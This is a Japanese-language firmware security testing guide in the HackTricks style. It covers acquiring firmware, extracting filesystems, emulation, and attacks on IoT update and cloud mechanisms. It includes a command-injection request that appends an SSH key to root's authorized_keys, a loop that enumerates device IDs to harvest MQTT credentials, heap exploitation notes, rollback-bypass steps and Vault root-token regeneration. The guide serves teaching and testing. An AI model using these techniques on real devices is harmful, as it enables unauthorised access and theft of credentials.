# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Introduction**

### 関連リソース


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmwareは、hardwareコンポーネントとユーザーが操作するsoftware間の通信を管理および円滑化することで、deviceを正しく動作させる重要なsoftwareです。Firmwareは永続メモリに保存されるため、deviceは電源投入直後から重要な命令にアクセスでき、operating systemの起動につながります。Firmwareを調査し、場合によっては変更することは、security vulnerabilitiesを特定するための重要な手順です。

## **情報収集**

**情報収集**は、deviceの構成や使用されているtechnologyを理解するための重要な初期段階です。このプロセスでは、以下のデータを収集します。

- CPU architectureと実行されているoperating system
- Bootloaderの詳細
- Hardware構成とdatasheet
- Codebaseの指標とsourceの場所
- External libraryとlicenseの種類
- Update履歴と規制上のcertification
- Architectureおよびflow diagram
- Security assessmentと特定されたvulnerability

この目的では、**open-source intelligence (OSINT)** toolsが非常に有用です。また、利用可能なopen-source softwareコンポーネントを、manualおよびautomated review processによって分析することも有効です。[Coverity Scan](https://scan.coverity.com)や[Semmle’s LGTM](https://lgtm.com/#explore)などのtoolsは、potential issueの発見に活用できるfree static analysisを提供します。

## **Firmwareの取得**

Firmwareは、複数の方法で取得できます。それぞれ複雑さのレベルが異なります。

- Source（developer、manufacturer）から**直接取得**する
- 提供された手順に従って**build**する
- Official support siteから**download**する
- Hosted firmware fileを見つけるために**Google dork** queryを使用する
- [S3Scanner](https://github.com/sa7mon/S3Scanner)などのtoolsを使用して**cloud storage**に直接アクセスする
- Man-in-the-middle techniqueによって**update**をinterceptする
- **UART**、**JTAG**、**PICit**などの接続を介してdeviceから**extract**する
- Device communication内のupdate requestを**sniff**する
- **Hardcoded update endpoint**を特定して使用する
- Bootloaderまたはnetworkから**dump**する
- 他の方法がすべて失敗した場合、適切なhardware toolを使用してstorage chipを**removeしてread**する

### UART-only logs: flash内のU-Boot envを介してroot shellを強制する

UART RXが無視される場合（logsのみ）、**U-Boot environment blobをofflineで編集**することで、init shellを強制できます。

1. SOIC-8 clipとprogrammer（3.3V）を使用してSPI flashをdumpします。
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. U-Boot env partitionを特定し、`bootargs`を編集して`init=/bin/sh`を追加し、**U-Boot env CRC32**をblobに対して再計算します。
3. env partitionのみをreflashしてrebootします。UART上にshellが表示されるはずです。

これは、bootloader shellが無効化されているものの、external flash accessによってenv partitionへの書き込みが可能なembedded deviceで有用です。

## Firmwareの分析

**Firmwareを入手した**ので、どのように扱うべきかを把握するため、Firmwareに関する情報をextractする必要があります。そのために使用できるtoolは複数あります。
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
それらのツールであまり見つからない場合は、`binwalk -E <bin>` を使用してイメージの **entropy** を確認してください。entropy が低い場合、暗号化されている可能性は低いです。entropy が高い場合は、暗号化されている可能性が高いです（何らかの方法で圧縮されている可能性もあります）。

さらに、これらのツールを使用して **firmware 内部に埋め込まれたファイル** を抽出できます:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

または [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) を使用してファイルを調査できます。

### ファイルシステムの取得

前述の `binwalk -ev <bin>` などのツールを使用すれば、**ファイルシステムを抽出**できているはずです。\
Binwalk は通常、**ファイルシステムの種類を名前とするフォルダー**内に抽出します。一般的には、squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfs のいずれかです。

#### 手動でのファイルシステム抽出

場合によっては、binwalk の signatures にファイルシステムの **magic byte** が含まれていないことがあります。この場合は、binwalk を使用してファイルシステムの offset を特定し、バイナリから圧縮されたファイルシステムを **carve** して、以下の手順に従い、その種類に応じてファイルシステムを **手動で抽出**してください。
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Squashfs filesystemをcarvingするには、以下の **dd command** を実行します。
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
また、以下のコマンドを実行することもできます。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs（上記の例で使用）

`$ unsquashfs dir.squashfs`

その後、ファイルは "`squashfs-root`" directory に配置されます。

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 filesystems の場合

`$ jefferson rootfsfile.jffs2`

- NAND flash を使用する ubifs filesystems の場合

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware の分析

Firmware を取得したら、その構造と潜在的な vulnerabilities を理解するために dissect することが重要です。このプロセスでは、さまざまな tools を使用して firmware image を分析し、貴重な data を抽出します。

### Initial Analysis Tools

binary file（`<bin>` と表記）を初期 inspection するための一連の commands が用意されています。これらの commands は、file types の特定、strings の抽出、binary data の分析、partition と filesystem の詳細の把握に役立ちます。
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
イメージの暗号化状態を評価するため、`binwalk -E <bin>` で **entropy** を確認します。低い entropy は暗号化されていない可能性を示し、高い entropy は暗号化または圧縮の可能性を示します。

**embedded files** を抽出するには、**file-data-carving-recovery-tools** のドキュメントや、ファイル検査用の **binvis.io** などのツールおよびリソースが推奨されます。

### ファイルシステムの抽出

`binwalk -ev <bin>` を使用すると、通常はファイルシステムを抽出でき、多くの場合、ファイルシステムの種類（例：squashfs、ubifs）にちなんだディレクトリに出力されます。ただし、magic bytes が存在しないため **binwalk** がファイルシステムの種類を認識できない場合は、手動での抽出が必要です。これには、`binwalk` でファイルシステムの offset を特定し、その後 `dd` コマンドを使用してファイルシステムを carve out します。
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
その後、filesystem の種類（例: squashfs、cpio、jffs2、ubifs）に応じて、内容を手動で抽出するために異なるコマンドを使用します。

### Filesystem Analysis

filesystem を抽出したら、security flaw の検索を開始します。安全でない network daemon、hardcoded credentials、API endpoint、update server の機能、未コンパイルの code、startup script、offline analysis 用の compiled binary に注意を払います。

**主な場所**と検査対象には、以下が含まれます。

- ユーザー credentials を確認する **etc/shadow** と **etc/passwd**
- **etc/ssl** 内の SSL certificate と key
- 潜在的な vulnerability を確認するための configuration と script file
- さらなる analysis 用の embedded binary
- 一般的な IoT device の web server と binary

filesystem 内の機密情報と vulnerability の発見には、いくつかの tool が役立ちます。

- 機密情報の検索用の [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) と [**Firmwalker**](https://github.com/craigz28/firmwalker)
- 包括的な firmware analysis 用の [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- static および dynamic analysis 用の [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go)、[**EMBA**](https://github.com/e-m-b-a/emba)

### Compiled Binary の Security Check

filesystem 内で見つかった source code と compiled binary は、vulnerability の有無を確認するために精査する必要があります。Unix binary 用の **checksec.sh** や Windows binary 用の **PESecurity** などの tool により、悪用される可能性のある保護されていない binary を特定できます。

## 生成された URL token を介した cloud config と MQTT credentials の取得

多くの IoT hub は、次のような cloud endpoint から device ごとの configuration を取得します。

- `https://<api-host>/pf/<deviceId>/<token>`

firmware analysis 中に、`<token>` が hardcoded secret を使用して device ID からローカルで導出されていることが判明する場合があります。例:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

この設計では、deviceId と STATIC_KEY を知る者が URL を再構築して cloud config を取得できます。多くの場合、これにより plaintext の MQTT credentials と topic prefix が明らかになります。

実践的な workflow:

1) UART boot log から deviceId を抽出する

- 3.3V UART adapter（TX/RX/GND）を接続し、log を取得します。
```bash
picocom -b 115200 /dev/ttyUSB0
```
- cloud config URL patternとbrokerアドレスを出力している行を探します。例：
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) firmware から STATIC_KEY と token algorithm を復元する

- バイナリを Ghidra/radare2 に読み込み、config path（"/pf/"）または MD5 usage を検索する。
- algorithm（例：MD5(deviceId||STATIC_KEY)）を確認する。
- Bash で token を導出し、digest を大文字化する：
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) cloud config と MQTT credentials の収集

- URL を組み立てて curl で JSON を取得し、jq で parse して secrets を抽出する：
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) 平文 MQTT と脆弱な topic ACLs を悪用する（存在する場合）

- 回収した認証情報を使用して maintenance topics を subscribe し、機密性の高いイベントを探す：
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 予測可能なデバイス ID を列挙する（大規模に、許可を得た上で）

- 多くの ecosystem では、vendor の OUI/product/type バイトの後に、連番の suffix が埋め込まれています。
- 候補 ID を順番に試行し、token を導出して、プログラムから config を取得できます：
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- 大規模なenumerationを試みる前に、必ず明示的な許可を取得してください。
- 可能な場合は、対象ハードウェアを変更せずにsecretを復元するため、emulationまたはstatic analysisを優先してください。


firmwareをemulationするプロセスにより、デバイスの動作または個々のprogramに対する**dynamic analysis**が可能になります。このアプローチでは、hardwareやarchitectureへの依存により課題が生じる場合がありますが、root filesystemまたは特定のbinaryを、Raspberry Piなどのarchitectureとendiannessが一致するデバイス、あるいは事前構築済みのvirtual machineに転送することで、さらなるtestingを促進できます。

### 個々のBinaryのEmulation

単一のprogramを調査するには、そのprogramのendiannessとCPU architectureを特定することが重要です。

#### MIPS Architectureの例

MIPS architectureのbinaryをemulationするには、次のcommandを使用できます：
```bash
file ./squashfs-root/bin/busybox
```
また、必要なエミュレーションツールをインストールするには：
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
MIPS（big-endian）では `qemu-mips` を使用し、little-endian バイナリには `qemu-mipsel` を選択します。

#### ARM Architecture Emulation

ARM バイナリの場合もプロセスは同様で、`qemu-arm` emulator を使用して emulation を行います。

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) などの tools により、firmware の full emulation が可能になり、プロセスを自動化するとともに dynamic analysis を支援します。

## Dynamic Analysis in Practice

この段階では、実機または emulated device environment を使用して analysis を行います。OS と filesystem への shell access を維持することが重要です。emulation は hardware interactions を完全には再現できない場合があるため、emulation の再起動が必要になることがあります。analysis では filesystem を再確認し、公開されている webpages と network services を exploit し、bootloader の vulnerabilities を調査します。潜在的な backdoor vulnerabilities を特定するには、firmware integrity tests が重要です。

## Runtime Analysis Techniques

Runtime analysis では、gdb-multiarch、Frida、Ghidra などの tools を使用して、process または binary が動作する operating environment と相互作用し、breakpoints を設定し、fuzzing やその他の techniques によって vulnerabilities を特定します。

full debugger のない embedded targets では、**静的リンクされた `gdbserver` を device にコピーし、remote から attach します**：
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

IoT hub では、RF stack が **radio MCU** と Linux userland process の間で分割されていることが多い。実用的な workflow は、次の path を map することである。

1. 空中の **RF frame**
2. radio MCU 上の **controller-side parser**
3. Linux に転送される **serial/UART text または TLV protocol**（例: `/dev/tty*`）
4. main daemon 内の **application dispatcher**
5. **protocol-specific handler / state machine**

この architecture により、reversing target は 1 つではなく 2 つになる。controller が binary radio frame を `Group,Command,arg1,arg2,...` のような textual protocol に変換する場合は、次を特定する。

- **message group** と dispatch table
- どの message が **network** 由来で、どれが controller 自身から発生するか
- 正確な **manufacturer-specific discriminator field**（例: Zigbee の `manufacturer_code` と custom `cluster_command`）
- **commissioning**、discovery、または firmware/model download phase 中にのみ到達可能な handler

Zigbee では、pairing traffic を capture し、target が依然として default **Link Key** `ZigBeeAlliance09` に依存しているか確認する。依存している場合、commissioning traffic の sniffing によって **Network Key** が露出する可能性がある。Zigbee 3.0 の install code はこの exposure を低減するため、テスト対象 device が実際にそれを強制しているか確認する。

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL command は、standardized cluster よりも優れた target になることが多い。これは、十分に battle-tested されていない **custom parsing code** と内部 **FSM** に入力されるためである。

実用的な workflow:

- command dispatcher を reverse し、**vendor-only handler** を見つける。
- **FSM state**、**event**、**check**、**action**、**next-state** table を復元する。
- 自動的に次へ進む **transitional state** と、最終的に reset または attacker-controlled state を free する retry/error branch を特定する。
- buggy handler が常に到達可能だと仮定せず、daemon を vulnerable state に置くために、どの正規の protocol exchange が必要か確認する。

Timing-sensitive protocol では、Python framework からの packet replay は遅すぎる場合がある。より reliable な approach は、vendor-grade stack を使用して real hardware（例: **nRF52840**）上で正規 device を emulate することである。これにより、正しい **endpoint**、**attribute**、commissioning timing を target に認識させられる。

### Fragmented-download bug class in embedded daemons

**fragmented blob/model/configuration download** では、次のような firmware bug class が繰り返し現れる。

1. **first fragment**（`offset == 0`）が `ctx->total_size` を保存し、`malloc(total_size)` を実行する。
2. 後続 fragment は、`packet_total_size >= offset + chunk_len` のような attacker-controlled な **packet-local** field のみを validate する。
3. copy は、**original allocated size** に対する check なしに `memcpy(&ctx->buffer[offset], chunk, chunk_len)` を使用する。

これにより attacker は、次を送信できる。

- 小さな declared total size を持つ first valid fragment を送り、小さな heap allocation を強制する。
- **expected offset** と、より大きな `chunk_len` を持つ後続 fragment を送る。
- fresh check を満たしつつ、元々 allocate された buffer を overflow する forged packet-local size を送る。

vulnerable path が commissioning logic の背後にある場合、malformed fragment を送信する前に、target を想定された model-download または blob-download state に移行させるための十分な **device emulation** を exploit に含める必要がある。

### Protocol-driven `free()` triggers

Embedded daemon では、heap metadata exploitation を trigger する最も簡単な方法は、多くの場合「cleanup を待つ」ことではなく、**protocol 自身の error handling を強制する**ことである。

- malformed な follow-up fragment を送り、FSM を **retry** または **error** state に移行させる。
- retry threshold を超えさせ、daemon に **context を reset** させて corrupted buffer を free させる。
- この予測可能な `free()` を利用して、process が無関係な理由で crash する前に allocator-side primitive を trigger する。

これは、embedded Linux の **musl/uClibc/dlmalloc-like allocator** に対して特に有用である。chunk metadata の corruption により、unlink/unbin logic を write primitive に変えられる可能性がある。安定した pattern は、real bin pointer を直ちに上書きして process を crash させるのではなく、**size field** を corrupt して、overflow された buffer 内に用意した **fake chunk** へ allocator traversal を redirect することである。

## Binary Exploitation and Proof-of-Concept

特定した vulnerability の PoC を開発するには、target architecture と lower-level language による programming を深く理解する必要がある。Embedded system では binary runtime protection は稀だが、存在する場合は Return Oriented Programming (ROP) のような technique が必要になることがある。

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc は glibc と同様の fastbin を使用する。後続の large allocation によって `__malloc_consolidate()` が trigger される可能性があるため、fake chunk は check（妥当な size、`fd = 0`、および周囲の chunk が "in use" と認識されること）を通過できなければならない。
- **Non-PIE binaries under ASLR:** ASLR が有効でも main binary が **non-PIE** なら、binary 内の `.data/.bss` address は安定している。すでに有効な heap chunk header に似た region を target にすることで、fastbin allocation を **function pointer table** 上に配置できる。
- **Parser-stopping NUL:** JSON が parse される場合、payload 内の `\x00` によって parsing を停止させつつ、stack pivot/ROP chain 用の attacker-controlled bytes を後方に保持できる。
- **Shellcode via `/proc/self/mem`:** `open("/proc/self/mem")`、`lseek()`、`write()` を call する ROP chain により、既知の mapping に executable shellcode を配置して jump できる。

## Prepared Operating Systems for Firmware Analysis

[AttifyOS](https://github.com/adi0x90/attifyos) や [EmbedOS](https://github.com/scriptingxss/EmbedOS) のような operating system は、firmware security testing に必要な tool を備えた pre-configured environment を提供する。

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS は、Internet of Things (IoT) device の security assessment と penetration testing を支援するための distro である。必要な tool がすべて load された pre-configured environment を提供するため、多くの時間を節約できる。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): firmware security testing tool が preloaded された、Ubuntu 18.04 ベースの embedded security testing operating system。

## Firmware Downgrade Attacks & Insecure Update Mechanisms

vendor が firmware image に対する cryptographic signature check を実装していても、**version rollback (downgrade) protection は頻繁に省略される**。boot または recovery-loader が embedded public key による signature のみを verify し、flash される image の *version*（または monotonic counter）を比較しない場合、attacker は **有効な signature が付いた古い vulnerable firmware** を正規に install でき、patch 済みの vulnerability を再び利用可能にできる。

Typical attack workflow:

1. **古い signed image を取得する**
* vendor の public download portal、CDN、または support site から取得する。
* companion mobile/desktop application から extract する（例: `assets/firmware/` 下の Android APK 内）。
* VirusTotal、Internet archive、forum などの third-party repository から取得する。
2. 露出している update channel を介して device に image を **upload または serve** する。
* Web UI、mobile-app API、USB、TFTP、MQTT など。
* 多くの consumer IoT device は、Base64-encoded firmware blob を受け付け、server-side で decode して recovery/upgrade を trigger する *unauthenticated* HTTP(S) endpoint を公開している。
3. downgrade 後に、新しい release で patch された vulnerability を exploit する（例: 後から追加された command-injection filter）。
4. persistence を取得した後、検知を避けるために最新 image を flash し直すか、update を disable する。

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
脆弱な（downgradeされた）firmwareでは、`md5`パラメータがサニタイズされずにshell commandへ直接連結されるため、任意のcommandをinjectionできます（ここでは、SSH key-based root accessを有効化できます）。後のfirmwareバージョンでは基本的なcharacter filterが導入されましたが、downgrade protectionがないため、この修正は実質的に無意味です。

### Mobile AppsからのFirmwareのExtracting

多くのvendorは、companion mobile applications内に完全なfirmware imageを同梱し、appがBluetooth/Wi-Fi経由でdeviceをupdateできるようにしています。これらのpackageは通常、`assets/fw/`や`res/raw/`のようなpathのAPK/APEX内に暗号化されずに保存されています。`apktool`、`ghidra`、または単純な`unzip`などのtoolsを使えば、physical hardwareに触れることなく署名済みimageを取り出せます。
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### A/B slot設計におけるupdater限定のanti-rollback bypass

一部のvendorは、anti-downgrade **ratchet**を実装していますが、それは*updater*のlogic内部だけに限られます（例：CAN経由のUDS routine、recovery command、userspace OTA agent）。後段の**bootloader**がimageのsignature/CRCだけをcheckし、partition tableまたはslot metadataを信頼する場合、rollback protectionは依然としてbypass可能です。

典型的なweak design：

- Firmware metadataには、version descriptorと**security ratchet** / monotonic counterの両方が含まれる。
- Updaterはimage ratchetをpersistent storageに保存された値と比較し、より古いsigned imageをrejectする。
- Bootloaderはそのratchetを**parseせず**、selected slotをbootする前にheader、CRC、signatureのみをverifyする。
- Slot activationはpartition tableまたはper-slot generation counterに別途保存され、validatedされた正確なfirmware digestには**cryptographically bound**されていない。

これにより、dual-slot systemに**validate-one-image / boot-another-image** primitiveが生じます。Attackerが、current signed imageを使ってupdaterにslot Bをnext boot targetとしてmarkさせ、reboot前にslot Bをoverwriteできる場合、bootloaderは既にcommit済みのslot metadataだけをtrustするため、downgraded imageをbootする可能性があります。

一般的なabuse pattern：

1. **current signed** firmwareをpassive slotにuploadし、通常のvalidation/switch routineを実行して、そのlayoutがslotをnext activeとしてmarkするようにする。
2. **まだrebootしない**。同じsessionでslot-preparation/erase routineに再度入る。
3. stale boot-stateまたはstale slot-selection logicをabuseし、updaterに、直前にpromoteされた**同じphysical slot**をeraseさせる。
4. **older but still signed** firmwareをそのslotにwriteする。
5. ratchetをenforceするvalidation routineをskipして、直接rebootする。
6. Bootloaderはpromoteされたslotをselectし、signature/integrityのみをverifyして、old imageをbootする。

A/B update implementationをreverseするときに確認すべき事項：

- **boot-time flags**から導出されたslot selectionが、switch成功後にrefreshされない。
- `prepare_passive_slot()`-style routineが、**current committed layout**ではなくstale stateに基づいてslotをeraseする。
- `part_write_layout()`-style functionが**generation counter** / active flagだけをincrementし、validated image hashを保存しない。
- Ratchet checkがuserspaceまたはupdater codeに実装されているが、ROM / bootloader / secure boot stageには実装されていない。
- Eraseまたはrecovery routineが、contentをremoveしてrewriteした後もslotをbootableとしてmarkしたままにする。

### Update LogicのAssessment Checklist

* *update endpoint*のtransport/authenticationは十分にprotectされているか（TLS + authentication）？
* Flashing前にdeviceは**version numbers**または**monotonic anti-rollback counter**をcompareするか？
* Imageはsecure boot chain内でverifyされるか（例：ROM codeがsignatureをcheckする）？
* **bootloaderはupdaterと同じratchetをenforceするか**。それともsignature/CRCだけをcheckするか？
* Slot activation metadataは**validated firmware digest/versionにbound**されているか。それともpromotion後にslotをmodifyできるか？
* Slot switchがsuccessした後、deviceはrebootを強制されるか。それとも同じsession内で後続のupdate/erase routineに引き続きreach可能か？
* Userland codeは追加のsanity checkを実行するか（例：allowed partition map、model number）？
* *partial*または*backup* update flowは同じvalidation logicをreuseしているか？

> 💡  上記のいずれかが欠けている場合、そのplatformはおそらくrollback attackに対してvulnerableです。

## Vulnerable firmware to practice

Firmwareのvulnerability発見をpracticeするには、以下のvulnerable firmware projectをstarting pointとして使用してください。

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault stateからのfirmware decryption keyのrecovery

Update imageがsmall plaintext metadataとlarge high-entropy blobを混在させている場合、何かをbrute-forceする前にcontainer triageを行います：

- `hexdump`、`xxd`、`strings -tx`、`base64 -d`、`binwalk -E`を使用して、header、offset、line boundaryをdumpする。
- `Salted__`は通常、OpenSSL `enc` formatを意味します。続く8 bytesがsaltで、残りのbytesがciphertextです。
- `256` bytesに正確にdecodeされるBase64 fieldは、random firmware password/session keyをwrapするRSA-2048 ciphertextを見ている強いhintです。
- 同じfile内のdetached PGP materialは、authenticityのみをprotectしていることが多く、それがconfidentiality mechanismだとassumeしないでください。

Static key hunting（`grep`、`strings`、PEM/PGP search）がfailした場合、private keyだけをsearchするのではなく、**operational decrypt path**をreverseします：

- Updater / management binaryをdecompileし、encrypted blobを誰がreadするのか、どのhelper/APIがそれをunwrapするのか、またrequestするlogical key nameをtraceする。
- Extractしたroot filesystemから、KMS state（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`）に加えてunit fileとinit scriptをsearchする。
- Plaintextの`vault operator unseal ...`、recovery key、bootstrap token、またはlocal KMS auto-unseal scriptは、private-key materialと同等に扱う。

Applianceがoriginal Vault binaryとstorage backendをshipしている場合、Vault internalsをreimplementするよりも、そのenvironmentをreplayする方が通常は容易です：
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
クローンした KMS で root 権限を取得した状態で:

- 分離されたクローン内でのみ transit keys を exportable にする: `vault write transit/keys/<name>/config exportable=true`
- unwrap key を export する: `vault read transit/export/encryption-key/<name>`
- 復元した RSA key を、KMS が使用した正確な padding/hash の組み合わせで試す。PKCS#1 v1.5 decrypt の失敗と、デフォルトの OAEP decrypt の失敗だけでは、key が間違っているとは証明できない。多くの Vault-backed flow では OAEP with SHA-256 が使われる一方、一般的な libraries のデフォルトは SHA-1 である。
- payload が `Salted__` で始まる場合は、AES-CBC decryption を試行する前に、vendor の OpenSSL KDF（`EVP_BytesToKey`。legacy appliances では MD5 が使われることが多い）を正確に再現する。

これにより、「encrypted firmware」は、より一般的な問題に変わる。**appliance 側の operational keys を復元し、その後、正確な unwrap + KDF parameters を offline で再現する**。

## トレーニングと Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [Cracking Firmware with Claude: Senior-Level Skill, Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
